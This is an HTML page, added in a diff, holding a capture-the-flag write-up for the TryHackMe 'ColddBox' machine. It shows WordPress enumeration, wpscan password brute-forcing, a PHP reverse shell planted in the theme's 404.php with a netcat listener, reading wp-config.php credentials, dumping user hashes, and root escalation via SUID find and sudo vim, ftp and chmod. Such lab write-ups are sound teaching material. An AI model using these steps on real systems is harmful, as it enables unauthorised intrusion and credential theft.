@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+
+        <link rel="icon" type="image/jpg" href="../Images/Rouge_Death_dp.jpg">
+        <title>ColddBox</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="../css/styles.css">
+
+    </head>
+
+    <body>
+
+        <div class="navbar">
+            <h1>ColddBox<span class="blink">|</span></h1>
+            <p>
+                <a class="other-links" href="../index.html">home</a> . 
+                <a class="other-links" href="../writeups.html">writeups</a> . 
+                <a href="colddbox.html"><u>colddbox</u></a> | 
+                <a class="other-links" href="https://tryhackme.com/room/colddboxeasy">TryHackMe</a>
+            </p>
+            <button id="toggle" onclick="svg_changer()"></button>
+        </div>
+
+        <div id="table-of-contents">
+            <h3>Contents:</h3>
+            <a href="#enum">
+                <h4>
+                    Enumeration
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#nmap">
+                        Nmap
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#web-inspection">
+                        Manual Inspection
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#gobuster">
+                        Gobuster
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#wpscan">
+                        WPscan
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+            <br />
+            <a href="#exploit">
+                <h4>
+                    Exploitation
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#wpscan1">
+                        WPscan
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#shell-pop">
+                        Gaining Shell
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+            <br />
+            <a href="#priv-esc">
+                <h4>
+                    Privilege Escalation
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#method1">
+                        Method 1
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#method2">
+                        Method 2
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="phase">
+
+            <div class="phase-sec">
+                <h3 class="phase-title" id="enum">Enumeration:</h3>
+
+                <h4 id="nmap">Nmap</h4>
+<pre class="terminal-output">
+$ nmap -T4 -v -A 10.10.214.134
+Nmap scan report for 10.10.214.134
+Host is up (0.16s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.1.31
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: ColddBox | One more machine
+</pre>
+                <p>Nmap found only one port open i.e port 80.</p>
+
+                <h4 id="web-inspection">Manual Website Inspection</h4>
+                <div class="phase-img">
+                    <img src="../Images/wu/colddbox/http_manual_inspection.png" alt="Image of manual inspection of the website." />
+                </div>
+                <p>So it is a WordPress site. Let's enumerate more.</p>
+
+                <h4 id="gobuster">Gobuster</h4>
+<pre class="terminal-output">
+$ gobuster dir -u http://10.10.214.134 -w /opt/dirbuster/directory-list-2.3-medium.txt -t 20
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:            http://10.10.214.134
+[+] Method:         GET
+[+] Threads:        20
+[+] Wordlist:       /opt/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.1.0
+[+] Timeout:        10s
+===============================================================
+2021/01/07 12:58:08 Starting gobuster in directory enumeration mode
+===============================================================
+/wp-content (Status: 301)     
+/wp-includes (Status: 301)    
+/wp-admin (Status: 301)        
+/hidden (Status: 301)           
+Progress: 15900 / 220561 (7.21%)^C
+[!] Keyboard interrupt detected, terminating.
+                                
+===============================================================
+2021/01/07 13:00:31 Finished
+===============================================================
+</pre>
+                <p>Bruteforcing directories with gobuster, finds a directory <em>&quot;hidden&quot;</em>.</p>
+                <p>Navigating to that directory in the browser gives a hint on possible usernames.</p>
+
+                <h4 id="wpscan">WPscan</h4>
+<pre class="terminal-output">
+$ wpscan --no-banner --url http://10.10.214.134 -e u
+[+] URL: http://10.10.214.134/ [10.10.214.134]
+--snip--
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.214.134/wp-content/themes/twentyfifteen/
+ | Last Updated: 2020-12-09T00:00:00.000Z
+ | Readme: http://10.10.214.134/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.8
+ | Style URL: http://10.10.214.134/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.214.134/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ --snip--
+[i] User(s) Identified:
+
+[+] the cold in person
+ | Found By: Rss Generator (Passive Detection)
+
+[+] hugo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] c0ldd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] philip
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+</pre>
+                <p>It's long output from wpscan but there are two important things to observe, the theme used and the users identified.</p>
+                <p>If you google for <em>&quot;twentyfifteen&quot;</em> exploit you get a XSS Vulnerability. This doesn't help.</p>
+
+            </div>
+
+        </div>
+
+        <div class="phase">
+            <div class="phase-sec">
+
+                <h3 class="phase-title" id="exploit">Exploitation:</h3>
+
+
+                <h4 id="wpscan1">WPscan</h4>
+                <p>Let's try to bruteforce the wp-login using the usernames we found.</p>
+<pre class="terminal-output">
+$ wpscan --no-banner --url http://10.10.214.134 --usernames hugo,c0ldd,philip --passwords /opt/rockyou.txt
+--snip--
+Trying hugo / matthew Time: 00:00:16 &lt;&gt; (225 / 43033176)  0.00%  ETA: ??
+Trying c0ldd / robert Time: 00:00:16 &lt;&gt; (229 / 43033176)  0.00%  ETA: ??
+Trying philip / robert Time: 00:00:17 &lt;&gt; (230 / 43033176)  0.00%  ETA: ?
+Trying hugo / forever Time: 00:00:17 &lt;&gt; (234 / 43033176)  0.00%  ETA: ??
+Trying c0ldd / forever Time: 00:00:17 &lt;&gt; (235 / 43033176)  0.00%  ETA: ?
+--snip--
+[!] Valid Combinations Found:
+    | Username: [Redacted], Password: [Redacted]
+</pre>
+                <p>Now we have the credentials to login to admin panel, let's login.</p>
+
+                <h4 id="shell-pop">Gaining Shell</h4>
+                <p>
+                    After logging in go to theme-editor and let's change the <em>&quot;404.php&quot;</em> with a php-reverse-shell.
+                </p>
+                <div class="phase-img">
+                    <img src="../Images/wu/colddbox/php_rshell.png" alt="PHP reverse shell upload." />
+                </div>
+                <p>Now start a netcat listener on the attacker machine.<br />To execute the reverse shell navigate to <em>&quot;http://MACHINE-IP/wp-content/themes/twentyfifteen/404.php&quot;</em></p>
+                <div class="phase-img">
+                    <img src="../Images/wu/colddbox/nc_revshell.png" alt="Image of netcat reverse shell." />
+                </div>
+                <p>Awesome, we pop a shell as <em>&quot;www-data&quot;</em>. Let's upgrade the shell to more interactive one.</p>
+<pre class="terminal-output">
+$ nc -lvnp 1234
+Connection from 10.10.214.134:41398
+Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:04:56 up  1:39,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ColddBox-Easy:/$ ^Z
+[1]  + 6844 suspended  nc -lvnp 1234
+$ stty raw -echo; fg
+[1]  + 6844 continued  nc -lvnp 1234
+                                    export TERM=xterm
+www-data@ColddBox-Easy:/$
+</pre>
+                <p>Now we get a fully interactive shell. Let's enumerate the directories, only <em>&quot;wp-config.php&quot;</em> looks interesting.</p>
+            </div>
+        </div>
+
+        <div class="phase">
+            <div class="phase-sec">
+
+                <h3 class="phase-title" id="priv-esc">Privilege Escalation:</h3>
+
+
+                <h4 id="method1">Method 1</h4>
+                <p>Let's look for files with SUID bit set.</p>
+<pre class="terminal-output">
+www-data@ColddBox-Easy:/$ find / -type f -perm -4000 2>/dev/null
+/bin/su
+/bin/ping6
+/bin/ping
+/bin/fusermount
+/bin/umount
+/bin/mount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/find   &lt;&lt;------
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+--snip--    
+</pre>
+                <p>Okay, normally we won't find <em>&quot;find&quot;</em> to be set with SUID. Let's go to GTFOBins and search for find.</p>
+                <div class="phase-img">
+                    <img src="../Images/wu/colddbox/find_suid.png" alt="Image of GTFOBins SUID for find." />
+                </div>
+<pre class="terminal-output">
+www-data@ColddBox-Easy:/$ find . -exec /bin/sh -p \; -quit
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+#
+</pre>
+                <p>Now we are root.</p>
+
+                <h4 id="method2">Method 2</h4>
+                <p>Let's check the <em>&quot;wp-cofig.php&quot;</em> file.</p>
+
+<pre class="terminal-output">
+www-data@ColddBox-Easy:/var/www/html$ ls
+hidden		 wp-blog-header.php    wp-includes	  wp-signup.php
+index.php	 wp-comments-post.php  wp-links-opml.php  wp-trackback.php
+license.txt	 wp-config-sample.php  wp-load.php	  xmlrpc.php
+readme.html	 wp-config.php	       wp-login.php
+wp-activate.php  wp-content	       wp-mail.php
+wp-admin	 wp-cron.php	       wp-settings.php
+www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
+--snip--
+define('DB_NAME', 'colddbox');
+
+/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', '[Redacted]');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+--snip--
+</pre>
+                <p>We get MySQL database password for the user <em>&quot;c0ldd&quot;</em>. Let's dump the database.</p>
+<pre class="terminal-output">
+www-data@ColddBox-Easy:/$ mysql -u c0ldd -p
+Enter password: 
+--snip--
+MariaDB [colddbox]> select * from wp_users;
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+|  1 | c0ldd      | $P$BJs9aAEh2[Redacted]             | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
+|  2 | hugo       | $P$B2512D1AB[Redacted]             | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
+|  4 | philip     | $P$BXZ9bXCbA[Redacted]             | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+3 rows in set (0.00 sec)
+</pre>
+                <p>Let's try to use the password we got from the source code to change to user <em>&quot;c0ldd&quot;</em>.</p>
+<pre class="terminal-output">
+www-data@ColddBox-Easy:/$ su c0ldd 
+Password: 
+c0ldd@ColddBox-Easy:$ id
+uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+c0ldd@ColddBox-Easy:~$
+</pre>
+                <p>We now own user c0ldd, also note that user c0ldd is in the group lxd. This can be used to escalate privilage as root, <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">lxd/lxc Group - Privilege Escalation</a></p>
+
+                <p>Let's list all the commans that we can execute as sudo.</p>
+<pre class="terminal-output">
+c0ldd@ColddBox-Easy:~$ sudo -l
+[sudo] password for c0ldd: 
+Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+    (root) /usr/bin/vim
+    (root) /bin/chmod
+    (root) /usr/bin/ftp
+</pre>
+                <p>As the room description says we can escalate privilage in multiple ways. Let's look for all three commans in GTFOBins.<br />All three can be exploited. That's great for us.</p>
+
+                <br />
+
+                <b>ftp</b>
+<pre class="terminal-output">
+c0ldd@ColddBox-Easy:~$ sudo ftp
+ftp> !/bin/sh
+# id
+uid=0(root) gid=0(root) grupos=0(root)
+</pre>
+
+                <b>vim</b>
+<pre class="terminal-output">
+c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
+
+# id                               
+uid=0(root) gid=0(root) grupos=0(root)
+</pre>
+
+                <b>chmod</b>
+<pre class="terminal-output">
+c0ldd@ColddBox-Easy:~$ sudo chmod 4777 /bin/bash
+c0ldd@ColddBox-Easy:~$ ls -l /bin/bash
+-rwsrwxrwx 1 root root 1037528 jul 12  2019 /bin/bash
+c0ldd@ColddBox-Easy:~$ bash -p
+bash-4.3# id
+uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+</pre>
+
+                <p>These are all the methods I tried, let me know if there are more ways other than these for privilage escalation. My twitter account <a href="https://twitter.com/im_greej">@im_greej</a></p>
+
+            </div>
+        </div>
+
+        <script src="../js/themes.js"></script>
+        
+    </body>
+
+</html>
